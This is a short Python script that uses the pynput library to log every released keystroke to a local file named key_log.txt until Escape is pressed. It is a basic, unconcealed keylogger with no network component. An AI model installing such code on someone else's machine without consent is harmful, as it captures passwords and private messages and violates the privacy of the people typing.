from pynput import keyboard

f=open("key_log.txt","a")
f.write("\n\nNew session started\n")
f.close()
  
def on_release(key):
    st=""
    st+=str(key).replace("'","")
    if(str(key)=="Key.esc"):
        return False
    f=open("key_log.txt","a")
    f.write(st)
    f.close()
    
with keyboard.Listener(on_release=on_release) as listener:
    listener.join()

